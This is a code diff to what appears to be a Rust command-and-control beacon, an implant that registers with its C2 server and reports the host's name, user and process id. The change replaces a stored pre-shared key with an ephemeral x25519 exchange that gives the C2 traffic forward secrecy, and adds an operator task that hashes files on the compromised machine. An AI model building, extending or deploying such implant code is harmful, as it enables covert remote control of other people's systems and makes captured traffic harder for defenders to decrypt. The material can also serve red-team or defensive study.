@@ -51,7 +51,6 @@ pub fn discover_profile(endpoint: String, interval: Duration, jitter: Duration) 
 /// Runtime beacon state shared between the loop and the exit handler.
 pub struct BeaconRuntime {
     pub profile: Profile,
-    pub psk: Vec<u8>,
     transport: RwLock<Transport>,
     session_id: RwLock<Option<Uuid>>,
     key: RwLock<[u8; crypto::KEY_LEN]>,
@@ -71,7 +70,6 @@ impl BeaconRuntime {
             });
         BeaconRuntime {
             profile,
-            psk,
             transport: RwLock::new(transport),
             session_id: RwLock::new(None),
             key: RwLock::new(key),
@@ -114,6 +112,8 @@ impl BeaconRuntime {
     /// Register with the C2 and stash the assigned session id.
     async fn register(&self) -> Result<Uuid, AnyError> {
         let id = self.next_id();
+        // Roll a fresh ephemeral x25519 key for this registration.
+        let kp = crypto::KeyPair::generate();
         let reg = Register {
             hostname: self.profile.hostname.clone(),
             username: self.profile.username.clone(),
@@ -121,8 +121,10 @@ impl BeaconRuntime {
             arch: self.profile.arch.clone(),
             pid: self.profile.pid,
             addr: self.profile.addr.clone(),
-            session_key: encode_key(&self.psk),
+            session_key: encode_key(&kp.public_key()),
         };
+        // The register handshake and its ack ride the PSK key; only after
+        // deriving the DH session key does the volatile self.key switch over.
         let pt = serde_json::to_vec(&reg).map_err(|e| AnyError(e.to_string()))?;
         let ct = crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
         let env = Envelope::new(Kind::Register, id, None, ct);
@@ -133,6 +135,13 @@ impl BeaconRuntime {
         let ack_pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
             .map_err(|e| AnyError(e.to_string()))?;
         let ack: RegisterAck = serde_json::from_slice(&ack_pt).map_err(|e| AnyError(e.to_string()))?;
+        // Derive the forward-secret session key from our ephemeral secret and
+        // the server's ephemeral public key; every next frame uses this key.
+        let server_pub = decode_key(&ack.server_pub).map_err(|e| AnyError(e.to_string()))?;
+        let shared = kp
+            .shared_secret(&server_pub)
+            .map_err(|e| AnyError(e.to_string()))?;
+        *self.key.write().unwrap() = crypto::derive_key(&shared, crypto::SESSION_SALT);
         tracing::debug!(session = %ack.session_id, "registered");
         Ok(ack.session_id)
     }
@@ -388,6 +397,45 @@ impl BeaconRuntime {
                 }
                 continue;
             }
+            if task.command == "nw/hashes" {
+                match task.args.as_slice() {
+                    [path] => {
+                        let result = match tokio::fs::read(path).await {
+                            Ok(data) => {
+                                use sha2::{Digest, Sha256};
+                                let mut h = Sha256::new();
+                                h.update(&data);
+                                let digest = h.finalize();
+                                let hex: String =
+                                    digest.iter().map(|b| format!("{b:02x}")).collect();
+                                TaskResult {
+                                    task_id: task.id,
+                                    ok: true,
+                                    stdout: format!("{hex}  {path}").into_bytes(),
+                                    stderr: Vec::new(),
+                                    exit_code: 0,
+                                }
+                            }
+                            Err(e) => TaskResult {
+                                task_id: task.id,
+                                ok: false,
+                                stdout: Vec::new(),
+                                stderr: format!("hashes {path}: {e}").into_bytes(),
+                                exit_code: -1,
+                            },
+                        };
+                        self.pending.lock().unwrap().push(result);
+                    }
+                    _ => self.pending.lock().unwrap().push(TaskResult {
+                        task_id: task.id,
+                        ok: false,
+                        stdout: Vec::new(),
+                        stderr: b"usage: nw/hashes <path>".to_vec(),
+                        exit_code: -1,
+                    }),
+                }
+                continue;
+            }
             let result = runner::run(task.clone()).await;
             self.pending.lock().unwrap().push(result);
         }
@@ -443,6 +491,14 @@ impl BeaconRuntime {
 fn encode_key(k: &[u8]) -> String {
     use base64::Engine;
     base64::engine::general_purpose::STANDARD.encode(k)
+}
+
+fn decode_key(s: &str) -> Result<[u8; 32], String> {
+    use base64::Engine;
+    let raw = base64::engine::general_purpose::STANDARD
+        .decode(s)
+        .map_err(|e| e.to_string())?;
+    <[u8; 32]>::try_from(raw.as_slice()).map_err(|_| "server pub key must be 32 bytes".into())
 }
 
 fn rand_jitter(max: u64) -> u64 {
